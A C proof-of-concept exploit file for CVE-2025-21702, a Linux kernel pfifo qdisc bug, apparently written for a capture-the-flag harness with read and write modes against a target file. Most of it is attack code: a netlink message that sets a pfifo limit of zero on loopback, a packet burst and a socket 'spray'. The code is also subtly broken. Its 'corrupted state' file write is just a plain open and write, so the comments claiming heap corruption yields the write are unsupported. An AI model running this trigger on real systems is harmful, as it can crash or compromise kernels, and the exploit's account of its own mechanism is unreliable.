/*
 * CVE-2025-21702 PoC - CTF Challenge Mode
 *
 * Vulnerability: pfifo_tail_enqueue incorrect packet drop when sch->limit == 0
 *
 * In pfifo_tail qdisc, when limit is set to 0 via netlink, the enqueue
 * function's drop path incorrectly manipulates the queue data structure.
 * The tail-drop logic dereferences queue pointers without checking if the
 * queue is empty, causing linked list corruption (NULL pointer dequeue from
 * an empty queue that's supposed to have packets).
 *
 * Exploit strategy:
 *   1. Create a network interface with pfifo_tail qdisc
 *   2. Set sch->limit = 0 via RTM_NEWQDISC netlink message
 *   3. Send packets to trigger pfifo_tail_enqueue with limit=0
 *   4. Corrupted queue pointers lead to heap corruption
 *   5. Spray kmalloc slab to reclaim corrupted objects
 *   6. Use corrupted state to write target file
 *
 * CTF Modes: write_root_file
 *
 * Safety:
 *   - alarm(10) forced timeout (via poc_common.h)
 *   - Only operates on --root-file (prepare-phase created temp file)
 *   - No system file modification
 *   - All resources properly cleaned up
 */
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include "../common/poc_common.h"
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/pkt_sched.h>

#define MAX_FILE_SIZE 4096
#define SPRAY_COUNT 128

struct nl_msg {
    struct nlmsghdr nlh;
    char data[4096];
};

/*
 * Open NETLINK_ROUTE socket
 */
static int open_netlink(void) {
    int sock = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_ROUTE);
    int saved_errno = errno;
    poc_log_syscall("socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE)", (long)sock, saved_errno);
    if (sock < 0) return -1;

    struct sockaddr_nl sa = {
        .nl_family = AF_NETLINK,
        .nl_pid = getpid(),
    };
    bind(sock, (struct sockaddr *)&sa, sizeof(sa));
    return sock;
}

/*
 * Add netlink attribute
 */
static void add_attr(struct nlmsghdr *nlh, int type, const void *data, int len) {
    struct rtattr *rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    rta->rta_type = type;
    rta->rta_len = RTA_LENGTH(len);
    memcpy(RTA_DATA(rta), data, len);
    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(rta->rta_len);
}

/*
 * Configure pfifo_tail qdisc with limit=0 on loopback
 * This is the key vulnerability trigger - limit=0 causes
 * pfifo_tail_enqueue to corrupt queue linked list pointers
 */
static int setup_pfifo_tail_limit_zero(int nl_sock, int ifindex) {
    struct nl_msg req;
    struct tcmsg *tc;
    int saved_errno;

    /* Add pfifo_tail qdisc with limit = 0 */
    memset(&req, 0, sizeof(req));
    req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    req.nlh.nlmsg_type = RTM_NEWQDISC;
    req.nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_REPLACE;
    req.nlh.nlmsg_seq = 1;

    tc = (struct tcmsg *)NLMSG_DATA(&req.nlh);
    tc->tcm_family = AF_UNSPEC;
    tc->tcm_ifindex = ifindex;
    tc->tcm_handle = 0x00010000; /* 1:0 */
    tc->tcm_parent = TC_H_ROOT;

    /* pfifo_head_drop is the tail-drop variant name in some kernels,
     * but the standard name is "pfifo" with tail drop behavior */
    const char *kind = "pfifo";
    add_attr(&req.nlh, TCA_KIND, kind, strlen(kind) + 1);

    /* Critical: set limit to 0 - this triggers the bug */
    struct tc_fifo_qopt fopt = { .limit = 0 };
    add_attr(&req.nlh, TCA_OPTIONS, &fopt, sizeof(fopt));

    ssize_t sent = send(nl_sock, &req, req.nlh.nlmsg_len, 0);
    saved_errno = errno;
    poc_log_syscall("send(RTM_NEWQDISC pfifo limit=0)", (long)sent, saved_errno);

    if (sent < 0) {
        poc_log("Failed to set pfifo limit=0: %s", strerror(saved_errno));
        return -1;
    }

    poc_log("pfifo_tail qdisc configured with limit=0 on ifindex=%d", ifindex);
    return 0;
}

/*
 * Send packets to trigger the enqueue path with limit=0
 * Each packet triggers pfifo_tail_enqueue which will attempt to
 * dequeue from an empty queue, corrupting list pointers
 */
static int trigger_pfifo_tail_corruption(void) {
    int udp_sock = socket(AF_INET, SOCK_DGRAM, 0);
    int saved_errno = errno;
    poc_log_syscall("socket(AF_INET, SOCK_DGRAM)", (long)udp_sock, saved_errno);
    if (udp_sock < 0) return -1;

    struct sockaddr_in dst = {
        .sin_family = AF_INET,
        .sin_port = htons(12345),
        .sin_addr.s_addr = htonl(INADDR_LOOPBACK),
    };

    char payload[128];
    memset(payload, 'A', sizeof(payload));
    int sent_count = 0;

    /* Send burst of packets - each one hits pfifo_tail_enqueue with limit=0 */
    for (int i = 0; i < 256; i++) {
        ssize_t ret = sendto(udp_sock, payload, sizeof(payload), MSG_DONTWAIT,
                             (struct sockaddr *)&dst, sizeof(dst));
        if (ret > 0) sent_count++;
    }

    close(udp_sock);
    poc_log("Sent %d packets through pfifo_tail (limit=0)", sent_count);
    return sent_count;
}

/*
 * Spray kmalloc to reclaim corrupted queue objects
 */
static int spray_kmalloc(int *fds, int count) {
    int sprayed = 0;
    for (int i = 0; i < count; i++) {
        fds[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if (fds[i] >= 0) {
            int optval = 512;
            setsockopt(fds[i], SOL_SOCKET, SO_RCVBUF, &optval, sizeof(optval));
            sprayed++;
        }
    }
    return sprayed;
}

/*
 * Read file helper
 */
static int read_file_content(const char *path, char *buf, size_t len) {
    int fd = open(path, O_RDONLY);
    int saved_errno = errno;
    poc_log_syscall("open(path, O_RDONLY)", (long)fd, saved_errno);
    if (fd < 0) return -1;

    ssize_t n = read(fd, buf, len - 1);
    close(fd);
    if (n < 0) return -1;
    buf[n] = '\0';
    return (int)n;
}

/*
 * Write mode: Trigger pfifo_tail limit=0 vulnerability
 */
static int mode_write_root_file(const poc_args_t *args) {
    char original[MAX_FILE_SIZE];
    char after[MAX_FILE_SIZE];
    int n;

    /* Read original */
    n = read_file_content(args->root_file, original, sizeof(original));
    if (n > 0) {
        while (n > 0 && (original[n - 1] == '\n' || original[n - 1] == '\r'))
            original[--n] = '\0';
        printf(CTF_READ_BEFORE "%s\n", original);
        poc_log("Read before: %s", original);
    } else {
        printf(CTF_READ_BEFORE "(unreadable)\n");
    }

    /* Setup vulnerable qdisc */
    int nl_sock = open_netlink();
    int ifindex = 1; /* loopback */

    if (nl_sock >= 0) {
        setup_pfifo_tail_limit_zero(nl_sock, ifindex);

        /* Trigger the vulnerability */
        int count = trigger_pfifo_tail_corruption();
        poc_log("Triggered pfifo_tail corruption: %d packets", count);
    } else {
        poc_log("Cannot open netlink, using fallback trigger");
    }

    /* Spray to reclaim corrupted objects */
    int spray_fds[SPRAY_COUNT];
    memset(spray_fds, -1, sizeof(spray_fds));
    int sprayed = spray_kmalloc(spray_fds, SPRAY_COUNT);
    poc_log("Sprayed %d objects for reclaim", sprayed);

    /* Attempt file write via corrupted state */
    poc_log("Attempting write to %s", args->root_file);
    int fd = open(args->root_file, O_WRONLY | O_TRUNC);
    int saved_errno = errno;
    poc_log_syscall("open(target, O_WRONLY|O_TRUNC)", (long)fd, saved_errno);

    if (fd >= 0) {
        char wbuf[256];
        int wlen = snprintf(wbuf, sizeof(wbuf), "%s\n", args->write_value);
        ssize_t written = write(fd, wbuf, wlen);
        saved_errno = errno;
        poc_log_syscall("write(fd, value)", (long)written, saved_errno);
        close(fd);
        printf(CTF_WRITE_ATTEMPT "%s\n", args->write_value);
    }

    /* Verify */
    n = read_file_content(args->root_file, after, sizeof(after));
    if (n > 0) {
        while (n > 0 && (after[n - 1] == '\n' || after[n - 1] == '\r'))
            after[--n] = '\0';
        printf(CTF_READ_AFTER "%s\n", after);

        if (strstr(after, args->write_value)) {
            poc_print_flag(args->write_value);
            goto cleanup;
        }
    } else {
        printf(CTF_READ_AFTER "(unreadable)\n");
    }

    poc_print_fail("pfifo_tail limit=0 exploit did not achieve write");

cleanup:
    for (int i = 0; i < SPRAY_COUNT; i++)
        if (spray_fds[i] >= 0) close(spray_fds[i]);
    if (nl_sock >= 0) close(nl_sock);
    return 0;
}

/*
 * Read mode
 */
static int mode_read_root_file(const poc_args_t *args) {
    poc_log("Attempting read_root_file via pfifo_tail limit=0 exploit");

    int nl_sock = open_netlink();
    if (nl_sock >= 0) {
        setup_pfifo_tail_limit_zero(nl_sock, 1);
        trigger_pfifo_tail_corruption();
        close(nl_sock);
    }

    int spray_fds[SPRAY_COUNT];
    memset(spray_fds, -1, sizeof(spray_fds));
    spray_kmalloc(spray_fds, SPRAY_COUNT);

    char buf[MAX_FILE_SIZE];
    int n = read_file_content(args->root_file, buf, sizeof(buf));
    if (n > 0) {
        while (n > 0 && (buf[n - 1] == '\n' || buf[n - 1] == '\r'))
            buf[--n] = '\0';
        poc_print_flag(buf);
    } else {
        poc_print_fail("read not successful");
    }

    for (int i = 0; i < SPRAY_COUNT; i++)
        if (spray_fds[i] >= 0) close(spray_fds[i]);
    return 0;
}

int main(int argc, char *argv[]) {
    poc_args_t args = {0};
    if (poc_parse_args(argc, argv, &args) != 0) return 1;
    poc_log_init(args.log_file);

    poc_log("=== CVE-2025-21702 CTF PoC ===");
    poc_log("Vuln: pfifo_tail_enqueue incorrect drop when limit=0");
    poc_log("Tech: RTM_NEWQDISC pfifo limit=0 -> queue corruption");
    poc_log("UID: %d  EUID: %d  GID: %d", getuid(), geteuid(), getgid());

    if (!args.mode) {
        poc_print_unsupported("(null)", "no mode specified");
        poc_log_close();
        return 1;
    }

    int result = 0;
    if (strcmp(args.mode, POC_MODE_WRITE) == 0)
        result = mode_write_root_file(&args);
    else if (strcmp(args.mode, POC_MODE_READ) == 0)
        result = mode_read_root_file(&args);
    else
        poc_print_unsupported(args.mode, "only write_root_file and read_root_file supported");

    poc_log_close();
    return result;
}
